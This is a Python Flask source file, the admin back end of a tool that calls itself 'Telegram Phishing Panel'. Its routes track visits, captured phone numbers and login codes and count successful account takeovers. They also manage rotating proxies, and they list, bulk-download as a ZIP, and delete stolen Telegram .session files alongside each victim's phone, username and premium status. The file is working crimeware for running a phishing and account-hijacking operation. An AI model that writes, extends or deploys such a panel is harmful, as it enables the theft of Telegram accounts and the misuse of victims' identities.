#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
admin.py - Расширенная админ-панель для Telegram Phishing Panel
Версия: 3.2 - Исправлены все ошибки
Дата: 22.02.2026
"""

import os
import io
import json
import zipfile
import threading
import asyncio
import time
import psutil
import csv
import re
from datetime import datetime, timedelta
from flask import (
    Blueprint, request, render_template, session, 
    redirect, url_for, jsonify, current_app, send_file,
    make_response, flash
)
from functools import wraps
from stats_db import stats_db
from services.telegram_service import test_proxy_async, check_api_credentials

# Создаем blueprint
admin_bp = Blueprint('admin', __name__, url_prefix='/admin')

# ============================================
# ДЕКОРАТОРЫ И ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================

def admin_required(f):
    """Декоратор для проверки прав администратора."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin'):
            return redirect(url_for('admin.login'))
        return f(*args, **kwargs)
    return decorated_function

def run_async(func, *args):
    """Запуск асинхронной функции в потоке."""
    result = {}
    
    def wrapper():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result['value'] = loop.run_until_complete(func(*args))
        except Exception as e:
            result['error'] = str(e)
        finally:
            loop.close()
    
    thread = threading.Thread(target=wrapper)
    thread.start()
    thread.join(timeout=30)
    return result.get('value')

def run_async_with_timeout(func, timeout, *args):
    """Запуск асинхронной функции с таймаутом."""
    result = {}
    
    def wrapper():
        loop = None
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            coro = func(*args)
            future = asyncio.wait_for(coro, timeout=timeout)
            result['value'] = loop.run_until_complete(future)
        except asyncio.TimeoutError:
            result['error'] = 'Timeout'
        except Exception as e:
            result['error'] = str(e)
        finally:
            if loop:
                try:
                    loop.close()
                except:
                    pass
    
    thread = threading.Thread(target=wrapper)
    thread.daemon = True
    thread.start()
    thread.join(timeout=timeout + 5)
    
    if 'error' in result:
        return (False, None, result['error'])
    return result.get('value')

def log_admin_action(action, details=None):
    """Логирование действий администратора."""
    try:
        log_entry = {
            'timestamp': time.time(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'username': session.get('admin_username', 'admin'),
            'action': action,
            'details': details or {},
            'ip': request.remote_addr or '127.0.0.1'
        }
        
        log_file = os.path.join(current_app.config['LOGS_DIR'], 'admin_actions.json')
        logs = []
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        logs.append(log_entry)
        if len(logs) > 1000:
            logs = logs[-1000:]
        
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        
        with open(log_file, 'w', encoding='utf-8') as f:
            json.dump(logs, f, indent=2, ensure_ascii=False, default=str)
    except Exception as e:
        current_app.logger.error(f"Ошибка логирования: {e}")

def get_system_metrics():
    """Получение системных метрик."""
    try:
        cpu_percent = psutil.cpu_percent(interval=0.5)
        cpu_count = psutil.cpu_count()
        
        memory = psutil.virtual_memory()
        ram_percent = memory.percent
        ram_used = memory.used / (1024 ** 3)
        ram_total = memory.total / (1024 ** 3)
        
        disk = psutil.disk_usage('/')
        disk_percent = disk.percent
        disk_used = disk.used / (1024 ** 3)
        disk_total = disk.total / (1024 ** 3)
        
        net = psutil.net_io_counters()
        
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        
        processes = len(psutil.pids())
        
        return {
            'cpu': {
                'percent': cpu_percent,
                'count': cpu_count,
                'status': 'normal' if cpu_percent < 70 else 'warning' if cpu_percent < 90 else 'critical'
            },
            'ram': {
                'percent': ram_percent,
                'used': round(ram_used, 2),
                'total': round(ram_total, 2),
                'status': 'normal' if ram_percent < 70 else 'warning' if ram_percent < 90 else 'critical'
            },
            'disk': {
                'percent': disk_percent,
                'used': round(disk_used, 2),
                'total': round(disk_total, 2),
                'status': 'normal' if disk_percent < 70 else 'warning' if disk_percent < 90 else 'critical'
            },
            'network': {
                'bytes_sent': net.bytes_sent,
                'bytes_recv': net.bytes_recv,
                'packets_sent': net.packets_sent,
                'packets_recv': net.packets_recv
            },
            'uptime': str(uptime).split('.')[0],
            'boot_time': boot_time.strftime('%Y-%m-%d %H:%M:%S'),
            'processes': processes
        }
    except Exception as e:
        current_app.logger.error(f"Ошибка получения системных метрик: {e}")
        return {
            'cpu': {'percent': 0, 'count': 0, 'status': 'unknown'},
            'ram': {'percent': 0, 'used': 0, 'total': 0, 'status': 'unknown'},
            'disk': {'percent': 0, 'used': 0, 'total': 0, 'status': 'unknown'},
            'network': {'bytes_sent': 0, 'bytes_recv': 0, 'packets_sent': 0, 'packets_recv': 0},
            'uptime': '0:00:00',
            'boot_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'processes': 0
        }

# ============================================
# АУТЕНТИФИКАЦИЯ
# ============================================

@admin_bp.route('/login', methods=['GET', 'POST'])
def login():
    """Страница входа в админ-панель."""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if (username == current_app.config.get('ADMIN_USERNAME', 'admin') and 
            password == current_app.config.get('ADMIN_PASSWORD', '')):
            session['admin'] = True
            session['admin_username'] = username
            session['admin_role'] = 'superadmin'
            session.permanent = True
            
            log_admin_action('login', {'username': username})
            
            return redirect(url_for('admin.dashboard'))
        
        return render_template("admin/login.html", error="Неверные учетные данные")
    
    return render_template("admin/login.html")

@admin_bp.route('/logout')
def logout():
    """Выход из админ-панели."""
    log_admin_action('logout', {'username': session.get('admin_username')})
    session.clear()
    return redirect(url_for('admin.login'))

# ============================================
# ГЛАВНАЯ ПАНЕЛЬ
# ============================================

@admin_bp.route('/')
@admin_bp.route('/dashboard')
@admin_required
def dashboard():
    """Главная панель управления."""
    system_metrics = get_system_metrics()
    
    if stats_db:
        stats = stats_db.get_stats()
        proxies = stats_db.get_proxies()
    else:
        stats = {
            'visits': 0, 'phones': 0, 'codes': 0, 'success': 0, 'failed': 0,
            'visits_day_0': 0, 'visits_day_1': 0, 'visits_day_2': 0,
            'visits_day_3': 0, 'visits_day_4': 0, 'visits_day_5': 0, 'visits_day_6': 0
        }
        proxies = []
    
    now = datetime.now()
    dates = [(now - timedelta(days=i)).strftime('%d.%m') for i in range(6, -1, -1)]
    
    chart_visits = []
    chart_success = []
    
    for i in range(7):
        chart_visits.append(stats.get(f'visits_day_{i}', 0))
        chart_success.append(stats.get(f'success_day_{i}', 0))
    
    chart_labels = dates
    
    proxy_stats = {
        'total': len(proxies),
        'working': sum(1 for p in proxies if p.get('status') == 'working'),
        'dead': sum(1 for p in proxies if p.get('status') == 'dead'),
        'checking': sum(1 for p in proxies if p.get('status') == 'checking'),
        'unknown': sum(1 for p in proxies if p.get('status') == 'unknown')
    }
    
    recent_actions = []
    log_file = os.path.join(current_app.config['LOGS_DIR'], 'admin_actions.json')
    if os.path.exists(log_file):
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                all_logs = json.load(f)
                recent_actions = all_logs[-20:] if len(all_logs) > 20 else all_logs
        except Exception as e:
            current_app.logger.error(f"Ошибка загрузки логов: {e}")
    
    return render_template(
        "admin/dashboard.html",
        system_metrics=system_metrics,
        stats=stats,
        chart_labels=chart_labels,
        chart_visits=chart_visits,
        chart_success=chart_success,
        proxy_stats=proxy_stats,
        recent_actions=recent_actions,
        now=datetime.now
    )

# ============================================
# API ДЛЯ СТАТИСТИКИ
# ============================================

@admin_bp.route('/api/stats/realtime')
@admin_required
def realtime_stats():
    """API для получения статистики в реальном времени."""
    system = get_system_metrics()
    active_sessions = stats_db.get_active_sessions() if stats_db and hasattr(stats_db, 'get_active_sessions') else 0
    rps = stats_db.get_current_rps() if stats_db and hasattr(stats_db, 'get_current_rps') else 0
    success_rate = stats_db.get_success_rate() if stats_db and hasattr(stats_db, 'get_success_rate') else 0
    
    return jsonify({
        'timestamp': time.time(),
        'system': system,
        'active_sessions': active_sessions,
        'rps': rps,
        'success_rate': success_rate
    })

@admin_bp.route('/api/stats/history/<period>')
@admin_required
def stats_history(period):
    """API для получения исторических данных."""
    period_map = {'day': 24, 'week': 7, 'month': 30}
    limit = period_map.get(period, 24)
    
    if stats_db and hasattr(stats_db, 'get_history'):
        data = stats_db.get_history(period, limit)
    else:
        if period == 'day':
            labels = [f"{i}:00" for i in range(24)]
        else:
            labels = [f"Day {i+1}" for i in range(limit)]
        data = {'labels': labels, 'visits': [0] * limit, 'success': [0] * limit}
    
    return jsonify(data)

# ============================================
# УПРАВЛЕНИЕ ПРОКСИ - ИСПРАВЛЕННАЯ СЕКЦИЯ
# ============================================

@admin_bp.route('/proxies')
@admin_required
def proxies_page():
    """Страница управления прокси."""
    if not stats_db:
        flash("База данных не доступна", "error")
        return render_template("admin/proxies.html", proxies=[], stats={}, last_checks=[])
    
    proxies = stats_db.get_proxies()
    
    stats = {
        'total': len(proxies),
        'working': sum(1 for p in proxies if p.get('status') == 'working'),
        'dead': sum(1 for p in proxies if p.get('status') == 'dead'),
        'checking': sum(1 for p in proxies if p.get('status') == 'checking'),
        'unknown': sum(1 for p in proxies if p.get('status') == 'unknown')
    }
    
    last_checks = [p for p in proxies if p.get('last_check')]
    last_checks.sort(key=lambda x: x.get('last_check', 0), reverse=True)
    
    return render_template(
        "admin/proxies.html",
        proxies=proxies,
        stats=stats,
        last_checks=last_checks[:10]
    )

@admin_bp.route('/api/proxies', methods=['GET'])
@admin_required
def get_proxies():
    """API для получения списка прокси."""
    if not stats_db:
        return jsonify({'proxies': [], 'error': 'DB not available'}), 500
    proxies = stats_db.get_proxies()
    return jsonify({'proxies': proxies})

@admin_bp.route('/api/proxies', methods=['POST'])
@admin_required
def add_proxy():
    """API для добавления одного прокси."""
    if not stats_db:
        return jsonify({'success': False, 'error': 'DB not available'}), 500
    
    data = request.get_json()
    if not data:
        return jsonify({'success': False, 'error': 'No data'}), 400
    
    proxy_data = stats_db._parse_proxy_string(data.get('proxy', ''))
    if not proxy_data:
        return jsonify({'success': False, 'error': 'Неверный формат прокси'}), 400
    
    proxy_data['name'] = data.get('name', f"{proxy_data['host']}:{proxy_data['port']}")
    proxy_data['country'] = data.get('country', '')
    proxy_data['description'] = data.get('description', '')
    
    proxy_id = stats_db.add_proxy(proxy_data)
    log_admin_action('add_proxy', {'proxy_id': proxy_id, 'host': proxy_data['host']})
    
    return jsonify({'success': True, 'proxy_id': proxy_id})

@admin_bp.route('/api/proxies/bulk', methods=['POST'])
@admin_required
def add_proxies_bulk():
    """API для добавления нескольких прокси."""
    if not stats_db:
        return jsonify({'success': False, 'error': 'DB not available'}), 500
    
    data = request.get_json()
    proxies_text = data.get('proxies', '')
    
    result = stats_db.add_proxies_bulk(proxies_text)
    log_admin_action('add_proxies_bulk', {'added': result['added'], 'errors': len(result['errors'])})
    
    return jsonify(result)

@admin_bp.route('/api/proxies/<int:proxy_id>', methods=['PUT'])
@admin_required
def update_proxy(proxy_id):
    """API для обновления прокси."""
    if not stats_db:
        return jsonify({'success': False, 'error': 'DB not available'}), 500
    
    data = request.get_json()
    proxies = stats_db.get_proxies()
    
    for p in proxies:
        if p.get('id') == proxy_id:
            for key, value in data.items():
                if key not in ['id', 'last_check', 'status']:
                    p[key] = value
            stats_db.save()
            log_admin_action('update_proxy', {'proxy_id': proxy_id})
            return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Прокси не найден'}), 404

@admin_bp.route('/api/proxies/<int:proxy_id>', methods=['DELETE'])
@admin_required
def delete_proxy(proxy_id):
    """API для удаления прокси."""
    if not stats_db:
        return jsonify({'success': False, 'error': 'DB not available'}), 500
    
    stats_db.delete_proxy(proxy_id)
    log_admin_action('delete_proxy', {'proxy_id': proxy_id})
    return jsonify({'success': True})

@admin_bp.route('/api/proxies/<int:proxy_id>/test', methods=['POST'])
@admin_required
def test_proxy(proxy_id):
    """API для тестирования одного прокси."""
    try:
        if not stats_db:
            return jsonify({'success': False, 'error': 'DB not available'}), 500
        
        proxies = stats_db.get_proxies()
        proxy = next((p for p in proxies if p.get('id') == proxy_id), None)
        
        if not proxy:
            return jsonify({'success': False, 'error': 'Proxy not found'}), 404
        
        stats_db.update_proxy_status(proxy_id, 'checking')
        
        def test_and_update():
            try:
                result = run_async_with_timeout(test_proxy_async, 15, proxy)
                
                if result and isinstance(result, (tuple, list)) and len(result) >= 2:
                    if len(result) == 3:
                        success, speed, error = result
                    else:
                        success, speed = result
                        error = None
                    
                    status = 'working' if success else 'dead'
                    stats_db.update_proxy_status(proxy_id, status, f'{speed}ms' if speed else None, error)
                    log_admin_action('test_proxy', {
                        'proxy_id': proxy_id, 
                        'status': status, 
                        'speed': speed,
                        'error': error
                    })
                else:
                    stats_db.update_proxy_status(proxy_id, 'dead', None, 'Invalid test result')
            except Exception as e:
                stats_db.update_proxy_status(proxy_id, 'dead', None, str(e))
        
        thread = threading.Thread(target=test_and_update)
        thread.daemon = True
        thread.start()
        
        return jsonify({'success': True, 'message': 'Тестирование запущено', 'proxy_id': proxy_id})
        
    except Exception as e:
        current_app.logger.error(f"Error in test_proxy: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@admin_bp.route('/api/proxies/test_all', methods=['POST'])
@admin_required
def test_all_proxies():
    """API для тестирования всех прокси."""
    if not stats_db:
        return jsonify({'success': False, 'error': 'DB not available'}), 500
    
    proxies = stats_db.get_proxies()
    
    def test_all():
        for proxy in proxies:
            stats_db.update_proxy_status(proxy['id'], 'checking')
            result = run_async_with_timeout(test_proxy_async, 15, proxy)
            
            if result and isinstance(result, tuple):
                if len(result) == 3:
                    success, speed, error = result
                else:
                    success, speed = result
                    error = None
                
                status = 'working' if success else 'dead'
                stats_db.update_proxy_status(proxy['id'], status, f'{speed}ms' if speed else None, error)
            
            time.sleep(1)
    
    thread = threading.Thread(target=test_all)
    thread.start()
    
    log_admin_action('test_all_proxies', {'count': len(proxies)})
    return jsonify({'success': True, 'message': f'Тестирование {len(proxies)} прокси запущено'})

@admin_bp.route('/api/proxies/<int:proxy_id>/toggle', methods=['POST'])
@admin_required
def toggle_proxy(proxy_id):
    """API для включения/отключения прокси."""
    if not stats_db:
        return jsonify({'success': False, 'error': 'DB not available'}), 500
    
    new_status = stats_db.toggle_proxy(proxy_id)
    log_admin_action('toggle_proxy', {'proxy_id': proxy_id, 'enabled': new_status})
    return jsonify({'success': True, 'enabled': new_status})

@admin_bp.route('/api/proxies/stats')
@admin_required
def proxies_stats():
    """API для получения статистики использования прокси."""
    if not stats_db:
        return jsonify({'error': 'DB not available'}), 500
    
    proxies = stats_db.get_proxies()
    stats = {
        'total': len(proxies),
        'by_status': {'working': 0, 'dead': 0, 'unknown': 0, 'checking': 0},
        'by_type': {},
        'average_speed': 0,
        'total_requests': 0,
        'successful_requests': 0
    }
    
    speeds = []
    
    for p in proxies:
        status = p.get('status', 'unknown')
        stats['by_status'][status] = stats['by_status'].get(status, 0) + 1
        
        p_type = p.get('type', 'unknown')
        stats['by_type'][p_type] = stats['by_type'].get(p_type, 0) + 1
        
        if p.get('speed'):
            try:
                speed = float(p['speed'].replace('ms', ''))
                speeds.append(speed)
            except:
                pass
        
        stats['total_requests'] += p.get('requests_count', 0)
        stats['successful_requests'] += p.get('success_count', 0)
    
    if speeds:
        stats['average_speed'] = round(sum(speeds) / len(speeds), 2)
    
    if stats['total_requests'] > 0:
        stats['success_rate'] = round((stats['successful_requests'] / stats['total_requests']) * 100, 2)
    
    return jsonify(stats)

# ============================================
# ОСТАЛЬНЫЕ МАРШРУТЫ (СОКРАЩЕНО ДЛЯ ЭКОНОМИИ МЕСТА)
# ============================================

@admin_bp.route('/api-settings')
@admin_required
def api_settings():
    """Страница настроек API Telegram."""
    current_settings = {
        'api_id': current_app.config.get('API_ID'),
        'api_hash_configured': bool(current_app.config.get('API_HASH')),
        'proxy_enabled': current_app.config.get('PROXY_ENABLED', False),
        'proxy_type': current_app.config.get('PROXY_TYPE', 'socks5'),
        'proxy_host': current_app.config.get('PROXY_HOST'),
        'proxy_port': current_app.config.get('PROXY_PORT'),
        'proxy_username': bool(current_app.config.get('PROXY_USERNAME'))
    }
    return render_template("admin/api_settings.html", settings=current_settings)

@admin_bp.route('/accounts')
@admin_required
def accounts_page():
    """Страница управления аккаунтами."""
    sessions = []
    sessions_dir = current_app.config['SESSIONS_DIR']
    
    if os.path.exists(sessions_dir):
        for f in os.listdir(sessions_dir):
            if f.endswith('.session'):
                path = os.path.join(sessions_dir, f)
                mod_time = os.path.getmtime(path)
                acc_id = f.replace('.session', '')
                
                account_info = stats_db.get_account_info(acc_id) if stats_db and hasattr(stats_db, 'get_account_info') else {}
                
                sessions.append({
                    'id': acc_id,
                    'filename': f,
                    'phone': account_info.get('phone', acc_id),
                    'username': account_info.get('username', ''),
                    'first_name': account_info.get('first_name', ''),
                    'premium': account_info.get('premium', False),
                    'country': account_info.get('country', ''),
                    'owner': account_info.get('owner', 'system'),
                    'created': account_info.get('created', datetime.fromtimestamp(mod_time).isoformat()),
                    'modified': datetime.fromtimestamp(mod_time).strftime('%Y-%m-%d %H:%M:%S'),
                    'size': os.path.getsize(path),
                    'last_used': account_info.get('last_used', ''),
                    'requests_count': account_info.get('requests_count', 0)
                })
    
    sessions.sort(key=lambda x: x.get('modified', ''), reverse=True)
    
    stats = {
        'total': len(sessions),
        'premium': sum(1 for s in sessions if s.get('premium')),
        'with_username': sum(1 for s in sessions if s.get('username')),
        'total_requests': sum(s.get('requests_count', 0) for s in sessions)
    }
    
    return render_template("admin/accounts.html", accounts=sessions, stats=stats)

@admin_bp.route('/users')
@admin_required
def users_page():
    """Страница управления пользователями."""
    users = stats_db.get_users() if stats_db and hasattr(stats_db, 'get_users') else []
    return render_template("admin/users.html", users=users)

@admin_bp.route('/logs')
@admin_required
def logs_page():
    """Страница просмотра логов."""
    return render_template("admin/logs.html")

@admin_bp.route('/settings')
@admin_required
def settings_page():
    """Страница настроек системы."""
    settings = {
        'app_name': 'Telegram Phishing Panel',
        'version': '3.2',
        'debug': current_app.debug,
        'telegram': {
            'api_id': current_app.config.get('API_ID'),
            'api_hash_configured': bool(current_app.config.get('API_HASH')),
            'proxy_enabled': current_app.config.get('PROXY_ENABLED', False),
            'proxy_type': current_app.config.get('PROXY_TYPE', 'socks5'),
            'proxy_host': current_app.config.get('PROXY_HOST'),
            'proxy_port': current_app.config.get('PROXY_PORT')
        },
        'security': {
            'session_timeout': current_app.permanent_session_lifetime.total_seconds() / 3600,
            'admin_username': current_app.config.get('ADMIN_USERNAME'),
            'admin_password_configured': bool(current_app.config.get('ADMIN_PASSWORD'))
        },
        'paths': {
            'sessions_dir': current_app.config.get('SESSIONS_DIR'),
            'logs_dir': current_app.config.get('LOGS_DIR'),
            'stats_db': current_app.config.get('STATS_DB_PATH')
        },
        'limits': {
            'max_sessions': stats_db.get_max_sessions() if stats_db and hasattr(stats_db, 'get_max_sessions') else 1000,
            'rate_limit': stats_db.get_rate_limit() if stats_db and hasattr(stats_db, 'get_rate_limit') else 100
        }
    }
    return render_template("admin/settings.html", settings=settings)

@admin_bp.route('/sessions/download/<path:filename>')
@admin_required
def download_session(filename):
    """Скачивание файла сессии."""
    if '..' in filename or filename.startswith('/'):
        return "Invalid filename", 400
    
    filepath = os.path.join(current_app.config['SESSIONS_DIR'], filename)
    if not os.path.exists(filepath):
        return "File not found", 404
    
    log_admin_action('download_session', {'file': filename})
    return send_file(filepath, as_attachment=True, download_name=filename)

@admin_bp.route('/sessions/delete/<path:filename>')
@admin_required
def delete_session(filename):
    """Удаление файла сессии."""
    filepath = os.path.join(current_app.config['SESSIONS_DIR'], filename)
    if os.path.exists(filepath) and filename.endswith('.session'):
        os.remove(filepath)
        log_admin_action('delete_session', {'file': filename})
    return redirect(url_for('admin.accounts_page'))

@admin_bp.route('/sessions/download_all')
@admin_required
def download_all_sessions():
    """Скачивание всех сессий одним ZIP-архивом."""
    memory_file = io.BytesIO()
    sessions_dir = current_app.config['SESSIONS_DIR']
    
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        for f in os.listdir(sessions_dir):
            if f.endswith('.session'):
                filepath = os.path.join(sessions_dir, f)
                zf.write(filepath, f)
    
    memory_file.seek(0)
    log_admin_action('download_all_sessions', {'count': len(os.listdir(sessions_dir))})
    
    return send_file(
        memory_file,
        mimetype='application/zip',
        as_attachment=True,
        download_name=f'sessions_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip'
    )

@admin_bp.route('/sessions/delete_all')
@admin_required
def delete_all_sessions():
    """Удаление всех сессий."""
    sessions_dir = current_app.config['SESSIONS_DIR']
    count = 0
    
    for f in os.listdir(sessions_dir):
        if f.endswith('.session'):
            os.remove(os.path.join(sessions_dir, f))
            count += 1
    
    log_admin_action('delete_all_sessions', {'count': count})
    flash(f'Удалено {count} сессий', 'success')
    return redirect(url_for('admin.accounts_page'))